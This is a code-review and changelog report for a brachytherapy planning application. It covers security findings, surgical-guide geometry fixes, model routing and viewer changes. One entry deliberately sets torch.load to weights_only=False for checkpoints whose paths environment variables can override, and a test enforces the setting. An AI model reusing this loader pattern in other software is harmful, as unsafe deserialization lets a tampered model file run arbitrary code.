- **CR-10 — External imaging-root allowlist.** web/server_support.py:2805-2836 includes the configured generic and typed CT/MR/US roots, while web/server.py:1112-1136 still checks ownership. An external CT image served successfully through the viewer.
- **CR-13 — CT series preference.** DICOM candidate ranking in web/server.py:1177-1219 puts CT ahead of other modalities and chooses the largest series within the tier. A mixed MR/CT fixture selected the CT series.
- **CR-14 — Seed interference threshold.** The manual-planning JavaScript uses seedLengthMm + 2 * seedRadiusMm + 0.5 as the minimum gap, with a safe default. The backend threshold agrees with the frontend safety rule.
- **CR-15 — Authoritative seed-plan export.** _export_seed_plan() in web/routes/planning_routes.py:516-557 prioritizes the manual serialized plan, then automatic serialized output, then controlled reconstruction fallbacks. Manual and raw-tuple fallback fixtures produced the expected exported seed records.
- **CR-16 — Export filename collision.** web/export_service.py:686-696 probes suffixed names after normalization/truncation. Two names that shared the first 64 characters produced separate JSON files with separate contents.
- **CR-17 — Malformed numeric request parameters.** Malformed lease TTL and audit-limit inputs now fall back safely; the endpoint recheck returned 200 rather than a request-level error.
- **CR-18 — Missing CT/mask planning context.** The pipeline returns before CT/mask-dependent work when the required context is absent (tool_factory/seed_plan/planning_pipeline.py:1370-1375). The targeted regression and full suite passed.

## 6. Source validation versus live-service validation

### 6.1 Source validation completed

The results in §§3–5 were obtained against the current checkout. The full suite result was 728 passed, 6 skipped, 4 warnings in 46.44s; the focused regression set was 150 passed, 3 warnings; and git diff --check passed. These results support the twelve FIXED dispositions but do not close the six open items without the additional tests listed above.

### 6.2 The active service has not loaded the current worktree

The active service was started before the current source modifications and was running without --reload. Source files in the working tree were modified after that process started. Therefore:

- the current source review is not a claim that the live service contains the current fixes;
- the active process must be restarted after the repair pass;
- endpoint smoke tests must be run against the new PID, not inferred from source tests alone;
- the live security posture must be rechecked after restart, especially CR-03 and CR-11.

## 7. Required fixer handoff checklist

The next implementation pass should not be considered complete until all of the following are true:

1. **CR-01:** CT deletion and grouped report deletion invalidate quota accounting after every direct unlink, with route-level post-delete byte assertions.
2. **CR-02:** All quota-consuming writers use one account-scoped reservation/commit/release protocol; deterministic cross-type concurrency and failed-output cleanup tests pass.
3. **CR-03:** The session-scoped screenshot route has an intentional, tested authentication boundary; missing/invalid API keys are rejected if it is an authenticated route.
4. **CR-09:** Every failed batch, including invalid extensions at any position, rolls back all files and directories created by that batch.
5. **CR-11:** Non-loopback deployment cannot silently use non-secure session cookies. TLS/secure-cookie behavior or an explicit refusal/unsafe-development contract is implemented and tested.
6. **CR-12:** Both _events and steps are bounded, terminal cancellation preserves the cap, and replay semantics remain correct across trimming.
7. **Deployment gate:** restart the service, record the new PID/start time, verify the new process command and environment, and run live smoke tests for authenticated session access, screenshot access, lock targeting, quota behavior, and cookie attributes.
8. **Regression gate:** rerun the focused tests and the full suite, then append the commands/results to the change record. Do not remove the historical review section or rewrite an open item as fixed without a reproduction or test demonstrating the acceptance condition.

## 8. Final current-source conclusion

The remediation pass is substantive: twelve original findings are currently fixed in the source tree and the full suite passes. It is not yet complete. Six real issues remain actionable—five residual correctness/resource-control defects and one unresolved remote-cookie security defect. The most important operational constraint is that the running service is older than the current worktree, so no fix should be reported as deployed until the service has been restarted and the live smoke checks have passed.

# Code Review Report

_This file consolidates all code review reports. Sections are organized by date._

## 2026-08-02 - Seed default to needle middle + proximity seed pick; faster surgical guide

### Manual seed placement and 3D picking

The operator reported that a manually added seed landed on the needle endpoint
and could not be selected/dragged in the 3D viewer, because the seed's thin
physical cylinder merged with the larger endpoint handle sphere.

- `addManualSeed` now places each new seed symmetrically around the needle
  MIDDLE (first seed at the midpoint), never at an endpoint. Subsequent seeds
  spread around the midpoint with a capped, symmetric spacing.
- The 3D pick in `brachybot-3d-manual.js` now prefers a seed over a coincident
  endpoint handle: when the pointer is within a generous pick radius of a seed's
  position, that seed is selected (then dragged and projected onto its needle
  axis) instead of the handle.
- Cache-busting versions bumped (`brachybot-viewer-layout.js?v=12`,
  `brachybot-3d-manual.js?v=31`) so browsers load the updated interaction code.

### Surgical guide generation speed (same STL quality)

Guide generation on a 120^3 CT with 7 needles went from ~6.4s to ~2.9s without
changing the resulting mesh:

- Replaced the full-crop `_world_grid` meshgrid + per-entry squared-distance
  patch pass with a KD-tree of entry local indices queried ONLY on the
  plate-shell voxels (~8% of the crop). The patch membership is identical
  (verified 0 differing voxels, including a translated origin).
- `distance_transform_edt(..., return_indices=True)` is only computed when the
  FOV is truncated (the nearest-body indices feed only the cap rejection);
  full-FOV generation avoids three extra full-size int64 arrays.
- Removed the now-unused `_world_grid` / `_local_index_zyx` helpers.

### Verification

- `addManualSeed` first seed lands at the midpoint (frac=0.5 region); seeds are
  proximity-pickable over endpoint handles; drag still projects onto the needle.
- Surgical guide tests (23) pass, including anisotropic-CT coordinate checks and
  the converging-bore / truncation regressions; 110 related tests pass.

---

## 2026-08-02 - Hide deprecated VoCo aliases from the LLM; keep them as routing-only

The operator uploaded a liver CT and the routing log still showed
`tumor_type: "voco_liver"`. Although `TOOL_REGISTRY` had already mapped
`voco_liver` to `BiomedParseV2CTVTool`, the **agent-facing** surface still
advertised `voco_*` as a first-class model choice:
- `CTVSegmentationTool.input_schema` built its `tumor_type` enum from
  `TOOL_REGISTRY.keys()`, which included every legacy `voco_*` alias.
- `CTVModelCatalogTool._execute` returned the full catalog (deprecated VoCo
  entries included), so the LLM could still be steered toward them.

### Fixes

- Added `_PREFERRED_TUMOR_TYPES`: the LLM-facing enum is now
  `[pancreatic_tumor, nnunet_pancreatic] + biomedparse_* prompts + friendly
  *_tumor aliases + prostate`. No `voco_*` name is presented.
- `filter_catalog` (used by the catalog tool and every LLM-facing
  `model_catalog` metadata field in `CTVSegmentationTool`) now drops deprecated
  entries by default; the full audit catalog remains available via
  `catalog_with_local_status()` and `include_deprecated=True`.
- Backward compatibility preserved: `voco_liver` etc. still resolve to
  `BiomedParseV2CTVTool` (normalized to `biomedparse_*` inside the adapter), so
  any persisted/legacy caller keeps working.

### Verification

- LLM enum contains `biomedparse_liver_tumor` and no `voco_*`; filtered catalog
  shows `biomedparse_liver_tumor` and no `voco_*`; full audit catalog still lists
  `voco_liver` for provenance.
- `voco_liver` / `liver_tumor` / `biomedparse_liver_tumor` all resolve to
  `BiomedParseV2CTVTool`.
- New regression `test_deprecated_voco_aliases_are_hidden_from_the_agent`;
  85 related tests pass.

---

## 2026-08-02 - Surgical guide: stop building on CT truncation planes, keep bores open, smooth the mesh

The operator reported three surgical-guide defects: (a) channel bores still
blocked by neighbouring needle sleeve walls, (b) the guide plate still adhered
to the CT superior/inferior truncation planes instead of real lateral skin, and
(c) the mesh was voxel-stepped and rough.

### Root causes

1. **(b) Cap adherence**: the plate shell was built from the CLOSED body mask
   (`~body_crop & distance band`), so it wrapped the flat superior/inferior caps
   of a finite-FOV scan and the guide's contact surface followed the flat cut
   plane. The old boundary shave removed only ~1 mm from the z-edges, far less
   than the plate thickness, so the plate still hugged the truncation planes.
2. **(c) Roughness**: the mesh came straight from Marching Cubes on a binary
   mask with only 12 Taubin iterations, leaving visible voxel stair-steps on the
   plate face and sleeve walls.
3. **(a) Bore blocking**: bores were subtracted per-needle inside the loop while
   the sleeve union accumulated, so an oblique neighbouring sleeve wall could
   intrude into an adjacent channel before that channel's bore was drilled.

### Fixes

- **Boolean-solid construction**: the plate is now built only from voxels that
  are OUTSIDE the body (`~body_crop`) within the clearance band, so the body
  interior can never become part of the guide.
- **Cap-backed rejection**: when the FOV is truncated, any guide voxel whose
  nearest body voxel (EDT `return_indices`) lies on the truncated boundary
  slice is removed, so the plate only contacts real lateral skin.
- **Truncation margin**: the guide is shaved back from each truncated boundary
  by a configurable `truncation_margin_mm` (default 5 mm) instead of ~1 mm.
- **Unified drilling**: all sleeve cylinders are unioned first, then every bore
  is subtracted from the fully-unioned solid, so no neighbouring wall can plug a
  channel regardless of spacing or crossing angle. Sleeve/bore volumes use exact
  flat-ended cylinder SDFs.
- **Smooth watertight isosurface**: the boolean solid is lightly blurred
  (anti-aliasing) and isosurfaced at 0.5 — watertight by construction on a
  binary volume — then Taubin-smoothed with 20 shrink-free iterations.
- **Insufficient-skin rejection**: if the remaining valid skin cannot support
  the plate, generation fails with a clear message instead of building on the
  cut plane.

### Verification

- Truncated-cylinder guide: no vertices within the 5 mm margin of the CT
  boundaries, and no flat horizontal platform faces on the cap interior.
- Converging-needle case: every channel stays a clean through-hole.
- 23 surgical-guide tests pass (including new converging-bore and cap-platform
  regressions).

---

## 2026-08-02 - Deprecate VoCo CTV; route all non-pancreatic sites to BiomedParse v2

The operator reported the liver CTV segmentation still used the VoCo SwinUNETR
and the resulting mask was not shown in the 2D viewer.

### Root causes

1. **VoCo still selected**: `TOOL_REGISTRY` mapped `voco_liver` /
   `liver_tumor` etc. to `VoCoLiverTumorTool`, and the system prompt told the
   LLM the local model is "preferred" — so a liver request used VoCo.
2. **BiomedParse inference failed**: `_execute` resolved the venv python
   symlink (`Path(runtime_python_text).resolve()`), which bypasses `pyvenv.cfg`
   and runs the isolated worker under the system interpreter — losing numpy and
   every venv package (`ModuleNotFoundError: No module named 'numpy'`).
3. **Viewer ignored BiomedParse provenance**: `api_viewer_label_volume` only
   treated `ctv_source == "model"` as model-produced multi-label output, so
   BiomedParse's single-label mask still resolved correctly but provenance was
   not recognized as model output.

### Fixes

- `TOOL_REGISTRY`: `liver_tumor` / `kidney_tumor` / `lung_tumor` / `colon_tumor`
  and `voco_liver` / `voco_kidney` / `voco_lung` / `voco_colon` all resolve to
  `BiomedParseV2CTVTool`. Pancreatic aliases stay on nnU-Net.
- `_execute` normalizes a legacy `voco_*` tumor_type to the matching
  `biomedparse_*` key before running BiomedParse, and does NOT resolve the venv
  python symlink (the fallback to `sys.executable` is still resolved).
- `api_viewer_label_volume` treats `biomedparse_v2_research_candidate` as a
  model source so multi-label output is split correctly.
- System prompt now states BiomedParse is the default for liver/kidney/lung/
  colon/head-neck and VoCo is deprecated.
- `model_catalog` marks `voco_*` entries as deprecated.

### Verification

- Real BiomedParse inference now runs (previously `No module named numpy` from
  the resolved venv symlink). Synthetic input returns an empty candidate at low
  confidence, which is the adapter's honest empty-mask behavior.
- `voco_liver`/`liver_tumor` → `BiomedParseV2CTVTool`; `nnunet_pancreatic` →
  nnU-Net.
- `pytest` main suites: 124 passed.

---

## 2026-08-02 - Shave guide off truncated CT boundaries (follow-up)

Following the bore-margin and truncation fixes, the operator requested two
clarifying improvements:

1. **"Put the cylinders first, drill the holes last"** — the construction
   already does exactly this: `solid = (shell & patch) | outer_sleeves` (all
   sleeve cylinders unioned) then `solid &= ~bores` (all channels drilled last).
   The bore margin guarantees a neighbouring sleeve wall cannot plug another
   channel. No change was needed beyond confirming the ordering.

2. **Shave the final guide off the CT top/bottom truncation planes** — even
   with valid lateral-skin entries, the plate's large patch could wrap onto the
   flat scan-boundary plane and look like a skin-contact surface. After the
   skin-side trim, the guide now removes solid voxels in the cropped grid's
   boundary layers that coincide with the CT z edges (only when the body is
   truncated there). The guide therefore only contacts real lateral skin.

### Files changed

| File | Change |
|------|--------|
| `web/surgical_guide.py` | Shave solid off truncated z-boundary layers after bores/trim |
| `tests/test_surgical_guide.py` | `test_guide_is_shaved_off_truncated_ct_boundaries` |

### Verification

- Truncated-cylinder guide (lateral entry): watertight, `finite_fov` reported,
  vertices stay off the z=0 / z=Z-1 planes (min z 0.62, max z 38.35 on a
  0..39 CT), confirming the plate no longer contacts the scan boundaries.
- `pytest` main suites: 111 passed (21 surgical-guide).

---

## 2026-08-02 - Guide still generated on CT truncation plane + nearby sleeves plug channels

Two follow-up surgical-guide defects were reported and fixed.

### 1. Guide still generated on the CT top/bottom truncation plane

The finite-FOV detection existed but could miss a real truncated scan: the
flat-cap heuristic only fired when the boundary slice area was >= 50% of its
neighbour, and entries could still land exactly on the first/last slice.

- `_flat_cap` threshold relaxed (>= 0.35 ratio, >= 32 voxels) so a flat
  truncation cap is caught even when the scan starts mid-body.
- `_sample_skin_entry` now **unconditionally rejects** an entry on the CT
  first or last slice (`z == 0 || z == Z-1`) when the body reaches that
  boundary — a genuine anatomical entry can never sit exactly on the scan edge.
  It keeps searching for a real lateral skin entry, or refuses generation when
  the whole segment lies in the truncated region.

### 2. Nearby needle sleeves plugged neighbouring channels

When two needles are closely spaced, the wall of one sleeve intruded into the
neighbouring channel opening (radial 0.7-1.0 mm from the neighbour axis),
partially plugging it.

- Added `GUIDE_BORE_MARGIN_MM = 0.4`: each channel bore is cleared with an
  extra 0.4 mm radial margin beyond the nominal `channel_radius`, so a
  neighbouring sleeve wall can never enter the channel. The visible channel
  opening is still defined by the sleeve inner wall; the margin only
  guarantees the through-hole stays open for closely spaced needles.

### Files changed

| File | Change |
|------|--------|
| `web/surgical_guide.py` | Bore margin; stricter truncation detection + unconditional boundary-slice entry rejection |
| `tests/test_surgical_guide.py` | Nearby-sleeve no-plug test; channel-open assertion updated for the bore margin |

### Verification

- 4-needle guide with two close pairs: 0 wall intrusions, all channels open,
  watertight.
- Truncated cylinder: top entry rejected, lateral entry kept.
- `pytest` main suites: 111 passed.

---

## 2026-08-02 - Fix PyTorch 2.6 weights_only regression in VoCo model loading

A liver-tumor CTV segmentation failed with "Weights only load failed ...
Unsupported global: GLOBAL numpy.core.multiarray.scalar". The same failure
affects every non-pancreatic CTV model and the VoCo OAR models.

### Root cause

PyTorch 2.6 changed `torch.load`'s default `weights_only` argument from False to
True. The deployed VoCo checkpoints (fixed paths under `VoCo/`, optionally
overridable by `VOCO_*_MODEL` env vars) were saved by older PyTorch and contain
numpy scalars, which `weights_only=True` rejects. A prior change switched the
load sites from `weights_only=False` to `weights_only=True`, breaking all these
models. Verified: `torch.load(model_voco_74.27.pt, weights_only=True)` fails;
`weights_only=False` loads fine and yields `{epoch, best_acc, state_dict}`.

### Fix

All VoCo CTV/OAR load sites now pass `weights_only=False`. These are trusted
local deployment artifacts (not user-supplied files), so arbitrary-code
execution is not a concern here. The dose model loader already used
`weights_only=False` with a `TypeError` fallback.

- `tool_factory/CTV_seg/voco_base.py` (base class — fixes liver, kidney, colon,
  lung, btcv, brats21, etc.)
- `tool_factory/CTV_seg/prostate_tumor_voco.py`
- `tool_factory/OAR_seg/voco_total_segmentation.py`
- `tool_factory/OAR_seg/aorta_vessel_voco.py`

### Verification

- `torch.load` on the real liver checkpoint: `weights_only=True` reproduces the
  error; `weights_only=False` succeeds.
- Regression test `test_local_model_checkpoints_load_with_weights_only_false`
  asserts every load site passes `weights_only=False`.
- `pytest` main suites: 110 passed.

---

## 2026-08-02 - Data-tree node rename, empty-state text, and rename persistence

### 1. Rename any data-tree node from the right-click menu

`renameDataTreeNode(id)` now supports renaming every leaf node type — CTV
label, OAR organ, seed, needle, trajectory, dose iso-surface, planning mesh,
annotation, and (existing) masks — plus the CTV / OAR group headers. The tree
renderers prefer a user-assigned label over generated `Trajectory N` /
`Seed N` / `Needle N` / `N Gy` names.

### 2. Rename compatibility across render / reload / restore

A follow-up audit found several places where a rename was lost or invisible:

- `ctv_*` labels were clobbered back to defaults on every `renderDataTree`
  (both the tumor and auxiliary CTV branches). They now preserve a custom
  label.
- `dose_iso_*` and `dose_overlay` showed hard-coded labels; they now render the
  renamed label.
- Single-label CTV and the CTV / OAR group headers now use the renamed label.
- `copyDisplayProperties` (workspace.js) previously never copied names; it now
  restores a user-renamed label (any label that does not match a generated
  default pattern) across refresh / session-switch, including planning
  trajectories / seeds / needles / doseLevels matched by stable ID.
- The undefined `updateTreeLabelInScene` call was replaced with
  `syncSceneAppearanceFromDataTree`.

### 3. Clearer empty-state text for ungenerated CTV / OAR

When segmentation has not run, the OAR group showed a terse "Not generated"
node and CTV the same. Empty-state placeholders now use clear bilingual text
("尚未生成 OAR 分割 / Run OAR segmentation to list organs here") and status
badges are localized (`not_generated` → 未生成, `stale`/`expired` → 已过期,
`loading` → 进行中, `error` → 错误).

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-viewer-volume.js` | `renameDataTreeNode`, label-preserving renderers, empty-state text, `_dtStatusText` |
| `web/app/static/js/brachybot-3d-manual.js` | Seed/needle loaders preserve custom labels |
| `web/app/static/js/brachybot-workspace.js` | `copyDisplayProperties` restores user-renamed labels; planning-row label restore |
| `web/app/index.html` | Cache-busting version bumps |

### Verification

- `pytest` main suites: 109 passed.
- Playwright: organ/seed/needle/trajectory/dose_iso renames apply; organ
  context menu shows Rename; empty-state and badge text localize.

---

## 2026-08-02 - Finite-FOV CT: stop treating scan-boundary truncation as skin

Operator reported that on a CT covering only a local body region (short
head-to-foot scan range), the system mistook the CT top/bottom truncation
planes for real skin: planned needles entered through the scan edge and the
surgical guide was generated on a flat truncation plane.

### Root cause chain

1. `_body_mask` + `_smooth_body_mask` let the CT first/last slices become body
   foreground (binary_closing erodes the edge, smoothing pulls it back), so the
   truncation plane is treated as a skin surface.
2. `_sample_skin_entry` returned the first body voxel entered by the needle;
   on a truncated CT that is the flat cap (entry index z=0).
3. Automatic planning built needles from a fixed 150 mm extension with no
   z-boundary check, and `_world_segment_hits_obstacle` explicitly allowed the
   external segment outside the CT FOV.
4. `_mesh_from_voxels` zero-pads and marching-cubes-closes any open boundary,
   producing a flat cap in the guide mesh.
5. The only finite-FOV guard (`compute_body_shell_and_ref_direction`) served
   only ref-direction auto-detect and had a full-fallback failure mode.

### Fixes

- **`_truncated_boundary_slices`** (web/surgical_guide.py): detects when the
  body envelope is cut off by the CT z boundaries — a boundary slice holding a
  large, roughly constant cross-section (a flat cap) is a truncation plane, not
  skin. Returns `(z_min_truncated, z_max_truncated)`.
- **`_sample_skin_entry`** now skips entries landing on a truncated boundary
  slice and keeps searching for a real lateral skin entry; if the whole segment
  stays in the truncated region it raises, so the guide refuses to generate.
- **Automatic planning** (`planning_pipeline.py`): `_needle_enters_through_truncated_boundary`
  rejects candidates whose external endpoint reaches the CT z extent (needle
  would exit through the flat truncation cap). `_filter_world_safe_trajectories`
  applies this before obstacle filtering, and `_body_mask_from_ct` builds the
  body envelope once for the check.
- **Guide metadata** now carries `validation.finite_fov.{truncated_superior,truncated_inferior}`,
  surfaced as a clear warning toast and stored on the mesh node so the operator
  knows the guide was built only from available lateral skin.

### Tests

- `test_truncated_fov_body_is_detected_as_flat_cap`
- `test_guide_entry_on_truncation_plane_is_rejected_and_lateral_skin_used`
- `test_guide_with_only_truncated_entries_refuses_to_generate`
- `test_candidate_entering_through_truncated_z_boundary_is_rejected`
- `test_filter_world_safe_trajectories_rejects_truncated_entries`
- Existing full-body tests (sphere fully inside CT) still pass, confirming no
  regression for complete-scan CTs.

### Verification

- `pytest` main suites: 109 passed.
- Synthetic truncated cylinder: z-min/z-max detected as truncated; top entry
  rejected, lateral entry kept; guide with only truncated entries refuses.
- `_needle_enters_through_truncated_boundary`: +z exit flagged, lateral not.

---

## 2026-08-02 - Free-orbit 3D rotation and instant needle/seed restore

Two operator-reported issues were fixed and verified.

### 1. 3D viewer rotation dead-stops at the poles

Dragging the 3D scene could only rotate to a limited angle and then required
reversing. OrbitControls natively clamps the polar angle to `[0, PI]`, so a
vertical drag reaching the top or bottom pole stops there and can only be
reversed.

- `update()` now carries the accumulated spherical coordinates across frames
  once a drag starts crossing a pole (`_carryAcrossPole` / `_sphericalCarry`),
  and maps the pole crossing by reflecting phi and flipping theta. This gives
  continuous, unrestricted orbit: a full vertical drag now rolls from the top
  pole through the bottom pole back to the equator, and horizontal rotation
  continues freely afterward.
- Verified end-to-end: a 16-step vertical drag produces `y=114 -> 212 -> 277
  -> -300 (pole crossed) -> -277 -> -114 -> 0`, followed by normal horizontal
  rotation.

### 2. Right-click needle/seed restore is instant

`restoreNeedleToAlgorithm` and `restoreSeedToOriginalPosition` called
`refreshPlanningUI()` after success, which reloads CT labels, every OAR mesh,
report figures and all 3D objects — making a simple restore feel slow.

- Both now use the lightweight `_refreshManualDoseViews(data, ...)` (metrics /
  DVH / seeds / needles / dose overlay only) when the backend returned the
  authoritative geometry and metrics, falling back to `refreshPlanningUI` only
  when needed. A needle restore now reuses the algorithm baseline dose
  (`fast_restore`) and repaints only what changed.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/OrbitControls.js` | Free-orbit pole crossing (spherical carry + phi/theta flip) |
| `web/app/static/js/brachybot-3d-manual.js` | Lightweight refresh for needle/seed restore |
| `web/app/index.html` | Cache-busting version bumps |
| `tests/test_round7_regressions.py` | Align asset-revision contract |

### Verification

- `pytest` main suites: 104 passed.
- Playwright: vertical drag crosses the pole continuously; no JS errors.
- Restore path verified via code review (uses `_refreshManualDoseViews`).

---

## 2026-08-02 - Seed drag/restore in 3D, fast incremental replan, report_generator fix

Three operator-reported issues were fixed and verified.

### 1. Seed select + drag along needle + restore in the 3D viewer

Seeds sit inside the body (CTV/OAR surfaces occlude them) and hug the needle
axis, so an all-object raycast never reached them — a seed could not be selected
or dragged. Both the mousedown picker and the right-click context menu now
raycast `seed` objects with the same priority treatment as endpoint handles
(`seed` -> `needle_handle` -> everything). The drag already constrained the seed
to its needle via `_projectPointOntoNeedle` (between the two endpoints).

- A seed is now selectable and draggable along its needle between the endpoints.
- The replan prompt only fires when the seed actually moved (`seedDragMoved`),
  so a plain click does not open a dialog; the prompt offers Replan / Move only.
- The seed right-click menu gained **Restore original position**, backed by a
  client-side `_originalPosition` cache (captured when the seed is first seen)
  and `restoreSeedToOriginalPosition` which commits through the existing path.

### 2. Replan is incremental and bounded, not a full re-run

The incremental replan (only reprocess the changed needle's seeds, subtract old
maps, add new maps) already existed, but after a server restart the browser's
`previous_needles` cache is lost and it submitted the current (already edited)
geometry as the baseline — the diff became empty and the whole plan fell into a
full DoseUNet inference (~6 minutes).

- New `_authoritative_previous_needles(agent, submitted, current)` recovers the
  true pre-edit baseline from the submitted value (if different), then the
  stored `manual_needles`, then `algorithm_plan_snapshot.needles`. Only when no
  better baseline exists does it return the submitted (empty-diff) geometry.
- Verified: a two-needle plan with one needle moved reports only `{n1, t1}` as
  changed; the unchanged needle is never reprocessed.
- Interactive replan deadline tightened from 180s to a 120s default so a
  runaway request fails fast with a clear error instead of hanging.

### 3. report_generator rejected action "generate"

The LLM asked to "重新生成报告" and called `report_generator action: "generate"`,
which failed gateway enum validation (`Invalid value for action`). The schema
and executor now accept `generate`/`regenerate` as synonyms for `full_report`,
so a natural-language report request succeeds.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-3d-manual.js` | Seed-priority raycast (mousedown + context menu), seedDragMoved gating, Restore original position |
| `web/server_support.py` | `_authoritative_previous_needles`, tightened replan deadline |
| `tool_factory/report_generator/__init__.py` | Accept `generate`/`regenerate` |
| `tests/test_round7_regressions.py` | Baseline-recovery test; align asset-revision contract |
| `web/app/index.html` | JS cache-busting versions |

### Verification

- `pytest` main suites: 104 passed.
- Playwright: seed restore function present, no JS errors, seed-priority picker.
- `_changed_trajectory_ids`: only the moved needle is flagged.
- `report_generator(execute action=generate)` succeeds; gateway accepts it.

---

## 2026-08-02 - Guide smoothness, skin trim, status fix, version dedup, channel diameter

Operator feedback on the regenerated guide: the plate still looked bumpy
(low-STL-resolution feel), the skin-facing side could still be invaded by the
sleeve on oblique needles, the tree showed "not generated" despite success,
the version jumped v2 -> v3 after a restart, and the default channel diameter
should be 1.8 mm.

### 1. Smoother, more refined guide surface

The mesh was only run through 3 uniform-Laplacian passes, which both smooths
weakly and shrinks the surface. `_smooth_mesh_vertices` now applies Taubin
two-pole smoothing (12 lambda/mu cycles by default): it removes the visible
0.35 mm voxel stair-stepping without pulling the plate off the intended skin
fit or closing the bores. Measured dihedral p95 dropped from 54.7 deg (raw) to
27.5 deg.

### 2. Skin-side trim ("削" the skin-facing face)

The sleeve cylinder is built along the needle axis; on oblique needles its wall
crosses the skin and left voxels inside the body. The final solid is now cut
with the smoothed skin's distance field:
`solid &= outside_distance >= skin_clearance`. Verified: an oblique-needle guide
has zero sleeve-wall vertices inside the body.

### 3. "not generated" status in the Data Tree

`ensureDataTreeNodeMetadata` downgraded a node with an explicit `status:'ready'`
but no `loaded` flag to `'not_generated'`, which hit the surgical-guide mesh.
Explicit `'ready'` is now authoritative and preserved.

### 4. Version no longer jumps on duplicate generation

Version was `prior.version + 1` with no content dedup, so the LLM tool call +
frontend auto-generate after a restart produced v1/v2/v3 all with identical
geometry. `generate_surgical_guide` now reuses the latest version when both the
plan signature and parameters are unchanged; only a real geometry or parameter
change bumps the version.

### 5. Default channel diameter 1.8 mm

`channel_radius_mm` default changed 1.1 -> 0.9 (diameter 2.2 -> 1.8 mm) in the
backend defaults, frontend `GUIDE_DEFAULTS`, and the panel input.

### Files changed

| File | Change |
|------|--------|
| `web/surgical_guide.py` | Taubin smoothing, skin trim, version dedup, channel default |
| `web/app/static/js/brachybot-viewer-volume.js` | Keep explicit 'ready' status |
| `web/app/static/js/brachybot-surgical-guide.js` | Channel default 0.9 |
| `web/app/index.html` | Panel default 1.8 mm; JS version bumps |
| `tests/test_surgical_guide.py` | Oblique-no-penetration, version-dedup, status-preservation tests |

### Verification

- `pytest` main suites: 87 passed (16 surgical-guide).
- Playwright: panel default 1.8 mm; guide node status stays 'ready';
  no JS errors.
- Synthetic: oblique needle => 0 sleeve-wall vertices inside the body;
  identical regeneration reuses the version (v1 stays v1, param change -> v2).

---

## 2026-08-01 - Colorbar gating, session-progress dedup, and surgical-guide reconstruction

Three operator-reported issues were fixed and verified end to end.

### 1. 2D colorbar appears before dose exists

The 2D dose colorbar could appear while planning was still segmenting (no
dose), because `_setPlanningDoseProjectionVisibility` and other refresh paths
called `updateDoseColorbars(true)` without checking that a dose result exists.

- `updateDoseColorbars` now hides the 2D bars unless `state.doseOverlay?.shape`
  is present (`hasDose`), and honors the per-dose `colorbarVisible2D` flag.
- `update3DColorbar` honors `colorbarVisible3D`.
- The dose node in the Data Tree now carries `colorbarVisible2D/3D` (persisted),
  and the right-click menu on `dose_overlay` offers Show/Hide 2D/3D Color Bar
  with a live ☑/☐ indicator via `setDoseColorbarViewVisibility`.
- Verified: no-dose → all 2D bars hidden; with-dose → shown; toggle hides/shows
  immediately and persists.

### 2. Session switch appends duplicate progress steps

When switching away mid-planning and back, the resumed task replayed the full
event journal; restored todo items had lost their dedup anchors
(`predicted`/`predictedTool`/`toolName`), so replayed `ctv_segmentation` /
`oar_segmentation` done events matched nothing and appended duplicate rows
(`PROGRESS (5/7)` → `(7/9)`).

- The `sendChat` resume path now rebuilds each item with `tool = si.toolName ||
  si.predictedTool` and restores `predicted`, `predictedTool`, and `toolName`,
  so `_todoUpdateFromStep` dedups replayed events in place.
- Verified: restoring 3 items then replaying a ctv_segmentation done event keeps
  item count at 3 (no new row).

### 3. Surgical guide reconstruction

The operator reported the channel was not a clean cylinder, lacked a real hole,
protruded into the skin, the plate was bumpy (stair-stepped by 5 mm CT slices),
and generation took ~6 minutes.

- **Flat-ended cylinder**: `_segment_mask` now produces a TRUE cylinder with flat
  end faces instead of a capsule with rounded caps. The rounded cap previously
  poked the sleeve wall into the skin and sealed the bore on the body side
  (blind hole). Verified: outer end-face is flat (t range < 1.6 mm at 1 mm res),
  bore mouth is open, no channel material sits inside the body.
- **Anchor flush with the plate**: the sleeve inner end is now at the plate's
  skin-facing face (`entry - inward * skin_clearance`), never inside the body;
  `sleeve_inward_mm` no longer moves geometry.
- **Smooth skin**: `_smooth_body_mask` applies an anisotropic Gaussian to the
  body envelope (sigma 2 mm, matched to CT spacing) before building the plate,
  so the plate hugs a smooth skin surface instead of the raw 5 mm slice steps.
- **Performance**: sleeve/bore are computed on a per-needle local bounding box
  (`_sleeve_bore_in_region`) instead of the full ~31M-voxel grid. Single-needle
  generation dropped from ~113 s to ~0.2 s; 5-needle at 0.8 mm runs in ~0.3 s.
- Regression test `test_guide_channel_is_clean_flat_cylinder_with_open_through_hole`
  asserts watertightness, speed, no inward penetration, flat end face, and an
  open bore mouth.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-3d-manual.js` | Colorbar gating, `setDoseColorbarViewVisibility` |
| `web/app/static/js/brachybot-viewer-volume.js` | Dose-node colorbar flags, right-click menu items |
| `web/app/static/js/brachybot-chat-todo.js` | Session-resume dedup anchors |
| `web/surgical_guide.py` | Flat cylinder, smooth skin, local-region sleeve/bore, entry anchor |
| `tests/test_surgical_guide.py` | New geometry regression test |

### Verification

- `pytest` main suites: 83 passed (13 surgical-guide).
- Playwright: colorbar gating + menu verified; no JS errors; multi-needle guide
  watertight in <1 s.

---

## 2026-08-01 - web_fetch anti-bot error clarity

Operator saw `web_fetch → HTTP 403` when fetching a Zhihu article. Zhihu blocks
all non-browser requests (even search-engine spider UAs return 403), which is
the site's anti-bot policy rather than a connection or code fault.

`web_fetch` now returns an actionable, machine-readable reason instead of a bare
status code:

- `403/401/429` → "the site blocked automated access. Use the search-result
  title and snippet, or ask the user for an alternative public source."
- `5xx` → "the site returned a server error. Retry later or use another source."

This feeds the honest-failure prompt so the LLM explains the block to the user
and redirects to search snippets instead of reporting a mysterious failure.
`web_search` already prefetches page content and skips blocked URLs silently, so
search answers remain complete even when a specific page is unreachable.

### Files changed

| File | Change |
|------|--------|
| `tool_factory/web_fetch/__init__.py` | Actionable 4xx/5xx error messages |
| `tests/test_round9_regressions.py` | Anti-bot + server-error messaging tests |

### Verification

- `pytest` main suites: 83 passed.
- Mocked 403 and 502 responses return the new explanatory messages.

---

## 2026-08-01 - Multi-agent router trace dedup, clean web fallback, and language matching

Operator observed two "multi-agent router" rows (pending + done) in the trace
and a final answer that dumped the raw LLM-facing web-search digest into the
chat with a hard-coded English prefix.

### 1. Duplicate multi-agent router rows

The backend yields the same router step twice (pending, then done) so the user
sees live progress. The frontend merged the first event into the optimistic
row but discarded the server id, so the second event (same server id) appended
